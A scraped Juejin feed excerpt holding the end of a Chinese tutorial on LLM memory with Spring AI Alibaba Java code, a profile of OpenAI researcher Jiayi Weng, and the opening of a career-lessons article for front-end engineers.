<p>Step B: 向量空间搜索 (ANN Search)</p>
<p>在数据库中寻找与 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>V</mi><mrow><mi>q</mi><mi>u</mi><mi>e</mi><mi>r</mi><mi>y</mi></mrow></msub></mrow><annotation encoding="application/x-tex">V_{query}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">ery</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span> 距离最近（相似度最高）的 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi></mrow><annotation encoding="application/x-tex">K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span></span> 个向量。通常使用余弦相似度 (Cosine Similarity) 计算：</p>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>similarity</mtext><mo>=</mo><mfrac><mrow><mi>A</mi><mo>⋅</mo><mi>B</mi></mrow><mrow><mi mathvariant="normal">∥</mi><mi>A</mi><mi mathvariant="normal">∥</mi><mi mathvariant="normal">∥</mi><mi>B</mi><mi mathvariant="normal">∥</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">\text{similarity} = \frac{A \cdot B}{\|A\| \|B\|}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord text"><span class="mord">similarity</span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.3923em;vertical-align:-0.52em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8723em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∥</span><span class="mord mathnormal mtight">A</span><span class="mord mtight">∥∥</span><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span><span class="mord mtight">∥</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="mbin mtight">⋅</span><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span></p>
</li>
<li>
<p>Step C: 召回与过滤</p>
<p>数据库返回最匹配的原始文本片段。作为后端，你通常会在这里根据 user_id 做 Metadata Filter，确保 A 用户的提问不会检索到 B 用户的记忆。</p>
</li>
<li>
<p>Step D: 上下文注入 (Context Injection)</p>
<p>将检索出来的“记忆片段”拼接到当前的 Prompt 中。</p>
</li>
</ul>
<h4 data-id="heading-15">SAA的长期记忆存储</h4>
<p>Spring AI Alibaba 将长期记忆以 JSON 文档的形式存储在 Store 中。</p>
<p>每个记忆都在自定义的 <code>namespace</code>（类似于文件夹）下组织，并使用唯一的 <code>key</code>（类似于文件名）。命名空间通常包含用户或组织 ID 或其他标签，以便更容易地组织信息。</p>
<p>这种结构支持记忆的层次化组织。通过内容过滤器支持跨命名空间搜索。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> com.alibaba.cloud.ai.graph.store.stores.MemoryStore;
<span class="hljs-keyword">import</span> com.alibaba.cloud.ai.graph.store.StoreItem;

<span class="hljs-keyword">import</span> java.util.*;

<span class="hljs-comment">// MemoryStore 将数据保存到内存字典中。在生产环境中请使用基于数据库的存储实现</span>
<span class="hljs-type">MemoryStore</span> <span class="hljs-variable">store</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MemoryStore</span>();

<span class="hljs-type">String</span> <span class="hljs-variable">userId</span> <span class="hljs-operator">=</span> <span class="hljs-string">"my-user"</span>;
<span class="hljs-type">String</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> <span class="hljs-string">"chitchat"</span>;
List&lt;String&gt; namespace = List.of(userId, applicationContext);

<span class="hljs-comment">// 保存记忆</span>
Map&lt;String, Object&gt; memoryData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
memoryData.put(<span class="hljs-string">"rules"</span>, List.of(
    <span class="hljs-string">"用户喜欢简短直接的语言"</span>,
    <span class="hljs-string">"用户只说中文和Java"</span>
));
memoryData.put(<span class="hljs-string">"my-key"</span>, <span class="hljs-string">"my-value"</span>);

<span class="hljs-type">StoreItem</span> <span class="hljs-variable">item</span> <span class="hljs-operator">=</span> StoreItem.of(namespace, <span class="hljs-string">"a-memory"</span>, memoryData);
store.putItem(item);

<span class="hljs-comment">// 通过ID获取记忆</span>
Optional&lt;StoreItem&gt; retrievedItem = store.getItem(namespace, <span class="hljs-string">"a-memory"</span>);

<span class="hljs-comment">// 在此命名空间内搜索记忆，通过内容等价性过滤，按向量相似度排序</span>
List&lt;StoreItem&gt; items = store.searchItems(
    namespace,
    Map.of(<span class="hljs-string">"my-key"</span>, <span class="hljs-string">"my-value"</span>)
);
</code></pre>
<h4 data-id="heading-16">SAA的长期记忆管理</h4>
<p>SAA还可以进行对长期记忆的管理，我们可以使用 ModelHook 在模型调用前后自动加载和保存长期记忆。</p>
<p>同时，我们也可以在tool里面进行读取和写入长期记忆。</p>
<p>长期记忆的写入和召回等核心流程就如上面说到的一样，这里由于篇幅就不详细赘述。</p>
<h2 data-id="heading-17">总结</h2>
<p>本文讨论了Memory的概念，两种不同记忆机制的区别以及SAA如何处理不同记忆。</p>
<p>但是大模型应用开发Memory是门学问，也不可能一文能讲清楚所有场景该怎么做，比如短期记忆和长期记忆混合该怎么使用，那就等着读者去探索了。</p>
<p>如果你感觉这篇入门文章给你带来了不错的体感，那就给我点赞+收藏+关注吧❤️</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[翁家翌：从开源少年到 OpenAI 核心研究员的长期主义之路]]></title>    <link>https://juejin.cn/post/7596955804260286514</link>    <guid>https://juejin.cn/post/7596955804260286514</guid>    <pubDate>2026-01-20T01:54:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596955804260286514" data-draft-id="7596955804260270130" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="翁家翌：从开源少年到 OpenAI 核心研究员的长期主义之路"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2026-01-20T01:54:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ak啊"/> <meta itemprop="url" content="https://juejin.cn/user/237916932030253"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            翁家翌：从开源少年到 OpenAI 核心研究员的长期主义之路
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/237916932030253/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ak啊
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T01:54:37.000Z" title="Tue Jan 20 2026 01:54:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">翁家翌：从开源少年到 OpenAI 核心研究员的长期主义之路</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1df95116754c4cfc950748d2e8e7b851~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYWvllYo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478877&amp;x-signature=Q%2FgR5Fh5rTPUW0RfSXD7UXWNwHI%3D" alt="image1.png" loading="lazy"/></p>
<p><em>模型开发三阶段：预训练—后训练—RLHF（示意）</em></p>
<p>作为 Tianshou（天授）强化学习框架的作者和 OpenAI GPT-4 后训练（Post-training）团队的核心成员，翁家翌（Jiayi Weng）的成长路径本身就是一部关于“如何构建影响力”的案例。在 WhynotTV 的这期访谈中，他分享了从清华、CMU 到 OpenAI 的技术进阶，并拆解了强化学习、工业级基础设施（Infra）以及开源社区背后的逻辑。这既是对前沿技术的观察，也是一份在不确定性中投资未来的行动参考。</p>
<h3 data-id="heading-1">早期经历：投资未来与打破信息差</h3>
<p>翁家翌的“长期主义”在童年时期便已显现。早期接触计算机时，他更关注能在未来反复使用的能力构建；在高中信息学竞赛阶段，他敏锐体会到“信息差”的影响，理解高质量训练资源的重要性。</p>
<p>在清华就读期间，他选择以开源的方式降低信息壁垒：将作业、笔记与整理后的资料发布到 GitHub。最初的动机是分享，但随时间积累为个人信誉与社区影响力。开源不仅是代码共享，更是思想与方法的“联网”。</p>
<h3 data-id="heading-2">开源哲学：把工具当作一种“慈善”</h3>
<p>从早期资料分享到打造 Tianshou（天授）框架，翁家翌将“影响力”落在可被反复使用的工具上：</p>
<ul>
<li>Tianshou 作为强化学习库，补足了当时 PyTorch 生态在 RL 方面的空白，以工程化品质服务研究与实践。</li>
<li>tuixue online 作为签证查询工具，从实际问题出发降低求解成本。</li>
</ul>
<p>其核心价值观是追求 Impact（影响力）：工作是否切实解决问题、节约社会总成本。把写代码、做工具当作“公共基础设施”的建设，构成了长期的个人护城河。</p>
<h3 data-id="heading-3">强化学习与后训练：定义与挑战</h3>
<p>在大模型工业化场景中，后训练（Post-training）是承接预训练能力并对齐人类偏好的关键阶段。</p>
<p><strong>关键术语解析</strong></p>
<ul>
<li><strong>预训练（Pre-training）</strong>：让模型习得海量世界知识，解决“懂不懂”。</li>
<li><strong>后训练（Post-training）</strong>：激发模型能力并对齐人类价值观，解决“好不好用”。</li>
<li><strong>RLHF（Reinforcement Learning from Human Feedback）</strong>：以人类反馈为信号，通过强化学习优化模型行为。</li>
</ul>
<p>然而，将这些方法从实验室推向工业级，还面临三类核心挑战：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bc866b8f9cc44511a5c9194e5339d35c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYWvllYo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478877&amp;x-signature=CTQWuOdByDjCyjuE5Wvkv2CGfp0%3D" alt="image2.png" loading="lazy"/></p>
<p><em>工业级后训练的三类挑战（示意）：数据与偏好建模、算法稳定性、规模化基础设施</em></p>
<ol>
<li><strong>数据与偏好建模的复杂性</strong>：人类偏好模糊且难量化，构建高质量奖励模型（Reward Model）是首要难题。</li>
<li><strong>算法的稳定性</strong>：强化学习对超参数敏感，易出现不收敛或性能震荡；在超大规模训练中问题被放大。</li>
<li><strong>规模化基础设施（Infra）</strong>：当参数量与并发规模很大时，GPU 协同、分布式通信与可复现实验迭代成为决定因素。</li>
</ol>
<h3 data-id="heading-4">组织与产品：人才密度与确定性</h3>
<p>2022 年加入 OpenAI 的直观感受是人才密度高、层级扁平，个体能独当一面，沟通成本低。回顾 ChatGPT 的成功，内部对缩放定律（Scaling Laws）的信念与对工程极致的追求，使“规模化迭代 + 高密度团队”成为能力涌现的可预见引擎。</p>
<h3 data-id="heading-5">未来观察：瓶颈与方向</h3>
<p>未来 5–10 年值得关注的方向：</p>
<ol>
<li><strong>推理能力（Reasoning）</strong>：突破“概率预测”的局限，向更深层的规划与逻辑迈进。</li>
<li><strong>世界模型（World Models）</strong>：从文本统计走向对物理世界更真实的建模，支撑机器人与实体经济。</li>
<li><strong>数据质量与交互式学习</strong>：在高质量文本趋于枯竭背景下，利用合成数据与环境交互获取新信号。</li>
<li><strong>成本结构</strong>：降低推理成本，让能力可被广泛、可持续地使用。</li>
</ol>
<h3 data-id="heading-6">开放与治理的现实考题</h3>
<p>关于“是否足够开放”的讨论，本质是开放研究与安全/商业化之间的张力。为了实现宏大使命，必须依赖算力与资金投入，商业化是实现路径的一部分。人事与流动在高速发展中难以避免，关键在于技术路线与治理实践能否持续推进。</p>
<h3 data-id="heading-7">路径建议：给走在路上的人</h3>
<p>结合个人经历，给技术从业者的几点建议：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8d21536c20d646179af590753c5467b6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYWvllYo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478877&amp;x-signature=BDrZPCicUhQs%2Fs7BR37E12sdmPk%3D" alt="image3.png" loading="lazy"/></p>
<p><em>行动路径（示意）：工程能力—开源杠杆—长期主义</em></p>
<ul>
<li><strong>重视工程能力（Engineering）</strong>：优秀算法离不开扎实的工程与基础设施能力。</li>
<li><strong>用开源建立杠杆</strong>：通过高质量开源项目或技术输出积累信誉与连接。</li>
<li><strong>保持长期主义</strong>：围绕有长期价值的方向深耕，以系统性积累对抗短期焦虑。</li>
</ul>
<h3 data-id="heading-8">结语</h3>
<p>从清华园的开源少年到硅谷风暴中心的研究实践者，翁家翌的路径说明：持续分享、工程落地与长期投入，能构成可持续的影响力；与其追逐风口，不如打磨工具、解决真正重要的问题。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[写给前端同学的 21 条职场教训]]></title>    <link>https://juejin.cn/post/7597653098563387446</link>    <guid>https://juejin.cn/post/7597653098563387446</guid>    <pubDate>2026-01-21T10:20:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597653098563387446" data-draft-id="7597641580104597558" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="写给前端同学的 21 条职场教训"/> <meta itemprop="keywords" content="前端,后端,程序员"/> <meta itemprop="datePublished" content="2026-01-21T10:20:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="冴羽"/> <meta itemprop="url" content="https://juejin.cn/user/712139234359182"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            写给前端同学的 21 条职场教训
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/712139234359182/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    冴羽
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T10:20:44.000Z" title="Wed Jan 21 2026 10:20:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读12分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>很多人以为在大厂工作，就是不停地写代码、解决技术难题。</p>
<p><strong>但事实是：真正成功的工程师并不是那些代码写得最好的人，而是那些解决了代码以外事情的人。</strong></p>
<p>本篇和你分享 21 条职场教训。</p>
<p>这些教训，有的能让你少走几个月的弯路，有的则需要数年才能完全领悟。</p>
<p>它们都与具体的技术无关，因为技术变化太快，根本无关紧要。</p>
<p>但这些教训，项目换了一个又一个，团队换了一批又一批，始终在重复上演。</p>
<p>希望能帮助到你：</p>
<h2 data-id="heading-0">1. 最优秀的工程师都痴迷于解决用户问题</h2>
<p>很多人容易爱上一项新技术，然后到处找地方用它。</p>
<p>我干过，你肯定也干过。</p>
<p>但真正创造最大价值的工程师是反过来的：</p>
<p><strong>他们专注于深入理解用户问题，并让解决方案从这种理解中自然而然地涌现。</strong></p>
<p>以用户为中心意味着花时间处理支持工单，与用户沟通，观察用户遇到的困难，不断追问“为什么”，直到找到问题的症结所在。</p>
<p><strong>真正理解问题的工程师往往会发现，优雅的解决方案比任何人预想的都要简单。</strong></p>
<p>工程师如果一开始就想着如何解决问题，往往会为了寻找理由而人为地增加复杂性。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/97054cdbd7094129bfdf2af5cee7c820~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595644&amp;x-signature=lyMseaBuI1HU1lzBEE2GDMKNajI%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1">2. 正确很容易，共同达成正确才是真正的挑战</h2>
<p>即使你在技术上胜券在握，最终也可能输掉项目。</p>
<p>我曾亲眼目睹一些才华横溢的工程师，自诩为房间里最聪明的人，但总是默默地积攒怨气。最终表现为“莫名其妙的执行问题”和“莫名其妙的阻力”。</p>
<p><strong>关键不在于证明自己正确，而在于参与讨论以达成对问题的共识。</strong></p>
<p>为他人创造发言空间，并对自己确信的观点保持怀疑。</p>
